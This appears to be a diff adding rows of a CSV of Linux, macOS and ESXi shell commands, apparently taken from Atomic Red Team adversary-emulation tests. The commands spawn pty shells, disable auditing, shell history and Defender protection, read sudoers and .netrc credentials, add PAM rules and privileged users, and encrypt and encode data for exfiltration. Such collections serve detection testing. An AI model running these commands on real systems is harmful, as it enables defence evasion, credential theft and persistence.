+H177,"which_python=$(which python || which python3 || which python3.9 || which python2) && $which_python -c ""import pty;pty.spawn('""'""'/bin/sh'""'""')"" && exit && $which_python -c ""import pty;pty.spawn('""'""'/bin/bash'""'""')"" && exit"
+H178,"ENCODED=$(echo '""'""'#{message}'""'""' | xxd -ps -c 256) && printf $ENCODED | xxd -r -p && echo $ENCODED | xxd -r -p && echo $(echo $ENCODED) | xxd -r -p && echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file} && echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file} && echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p && echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p"
+H179,-l &&  cat /etc/sudoers &&  vim /etc/sudoers
+H180,"bash -c '""'""'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" EXIT'""'""'"
+H181,mdatp config real-time-protection --value disabled
+H182,"set +o history && echo '""'""'set +o history'""'""' >> ~/.bashrc && . ~/.bashrc && history -c"
+H183,sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
+H184,set +o history
+H185,"sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
+H186,export HISTCONTROL=ignoreboth && #{evil_command}
+H187,"timeout --preserve-status #{timeout} whois -h #{remote_host} -p #{remote_port} ""#{query}"" > #{output_file}"
+H188,for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
+H189,"curl -s -A ""HttpBrowser/1.0"" -m3 #{domain} && curl -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 #{domain} && curl -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 #{domain} && curl -s -A ""*<|>*"" -m3 #{domain}"
+H190,auditctl -e 0
+H191,zip -r  #{input_folder}/#{input_file}.zip #{input_folder} && openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc && cat #{input_folder}/#{input_file}.enc | base64
+H192,"bash -c '""'""'trap ""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh"" SIGINT && kill -SIGINT $$'""'""'"
+H193,"ip tcp_metrics show |grep --invert-match ""^127\."""
+H194,auditctl -e 0
+H195,pw useradd art -g wheel -s /bin/sh && echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0 && pw lock art && pw usermod art -e +1d && pw unlock art && pw user mod art -e +99d && su art && whoami && exit
+H196,"echo '""'""'#{text_to_append}'""'""' >> ~/.profile"
+H197,auditctl -e 0
+H198,echo 0> /var/spool/mail/#{username}
+H199,"Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false && Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass} && Get-AdvancedSetting -Entity #{vm_host} -Name '""'""'Security.AccountLockFailures'""'""' | Set-AdvancedSetting -Value '""'""'0'""'""' -Confirm:$false && Disconnect-VIServer -Confirm:$false"
+H200,"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip UP"" || : ; done"
